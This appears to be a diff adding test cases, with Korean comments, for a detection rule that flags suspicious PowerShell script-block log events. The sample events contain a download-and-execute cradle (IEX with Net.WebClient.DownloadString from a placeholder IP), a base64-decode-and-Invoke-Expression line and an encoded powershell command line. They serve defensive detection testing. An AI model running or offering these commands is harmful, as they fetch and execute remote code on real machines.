@@ -1,0 +1,32 @@
+# 의심스러운 PowerShell 실행 — 스크립트 블록 로깅(4104)의 본문에 공격 도구에서 흔한 글자
+rule: 1000015
+match:
+  - why: 원격 스크립트를 받아 바로 실행 (IEX + Net.WebClient.DownloadString) — 의심 블록은 수준 3(경고)으로 남는다
+    windows: {event: 4104, where: {ScriptBlockText: "Write-Output 'wlm-scriptblock-check'"}}
+    fields:
+      Level: 3
+      Message: "Creating Scriptblock text (1 of 1):\r\nIEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')\r\n\r\nScriptBlock ID: 7d1c3a4b-0e2f-4a5b-8c6d-9e0f1a2b3c4d\r\nPath: "
+    inserts:
+      ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')"
+      ScriptBlockId: 7d1c3a4b-0e2f-4a5b-8c6d-9e0f1a2b3c4d
+  - why: 인코딩된 명령을 풀어 실행 (FromBase64String + Invoke-Expression)
+    windows: {event: 4104, where: {ScriptBlockText: "Write-Output 'wlm-scriptblock-check'"}}
+    fields:
+      Level: 3
+      Message: "Creating Scriptblock text (1 of 1):\r\n$s = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($e)); Invoke-Expression $s\r\n\r\nScriptBlock ID: 0b5e6f70-1a2b-4c3d-9e8f-7a6b5c4d3e2f\r\nPath: C:\\ProgramData\\u.ps1"
+    inserts:
+      ScriptBlockText: "$s = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($e)); Invoke-Expression $s"
+      ScriptBlockId: 0b5e6f70-1a2b-4c3d-9e8f-7a6b5c4d3e2f
+      Path: 'C:\ProgramData\u.ps1'
+no_match:
+  - why: 평범한 스크립트 블록
+    fails_on: [q]
+    windows: {event: 4104, where: {ScriptBlockText: "Write-Output 'wlm-scriptblock-check'"}}
+  - why: 같은 글자가 프로세스 만듦(4688)의 명령줄에 있어도 이 규칙은 4104 만 본다 (명령줄 감사는 따로)
+    fails_on: [event_id]
+    windows: {event: 4688}
+    fields:
+      Message: "A new process has been created.\r\n\r\nProcess Information:\r\n\tNew Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tProcess Command Line:\tpowershell -NoP -EncodedCommand SQBFAFgA"
+    inserts:
+      NewProcessName: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: powershell -NoP -EncodedCommand SQBFAFgA
